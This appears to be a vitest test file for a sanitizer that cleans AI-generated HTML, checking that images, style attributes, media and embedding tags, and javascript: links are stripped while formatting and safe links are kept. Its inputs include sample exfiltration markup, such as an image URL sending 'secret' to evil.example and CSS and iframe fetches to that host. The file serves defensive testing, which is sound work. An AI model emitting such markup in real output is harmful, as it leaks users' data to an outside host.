import { describe, expect, it } from 'vitest';

import { sanitizeAiHtml } from './sanitize-ai-html';

describe('sanitizeAiHtml', () => {
  it('should strip img tags entirely', () => {
    const result = sanitizeAiHtml(
      '<p>hi</p><img src="https://evil.example/?d=secret">'
    );
    expect(result).not.toContain('<img');
    expect(result).toContain('<p>hi</p>');
  });

  it('should strip style attributes that could fire CSS fetches', () => {
    const result = sanitizeAiHtml(
      '<div style="background:url(https://evil.example/x)">text</div>'
    );
    expect(result).not.toContain('style=');
    expect(result).toContain('text');
  });

  it('should strip media and embedding tags', () => {
    const result = sanitizeAiHtml(
      '<video src="https://evil.example/v"></video><iframe src="https://evil.example"></iframe><svg><image href="https://evil.example/s"/></svg>'
    );
    expect(result).not.toContain('<video');
    expect(result).not.toContain('<iframe');
    expect(result).not.toContain('<svg');
  });

  it('should keep formatting markup and safe links', () => {
    const result = sanitizeAiHtml(
      '<h2>Title</h2><p><strong>bold</strong> and <a href="https://example.com">link</a></p><ul><li>item</li></ul>'
    );
    expect(result).toContain('<h2>Title</h2>');
    expect(result).toContain('<strong>bold</strong>');
    expect(result).toContain('href="https://example.com"');
    expect(result).toContain('<li>item</li>');
  });

  it('should strip javascript: links', () => {
    const result = sanitizeAiHtml('<a href="javascript:alert(1)">x</a>');
    expect(result).not.toContain('javascript:');
  });
});
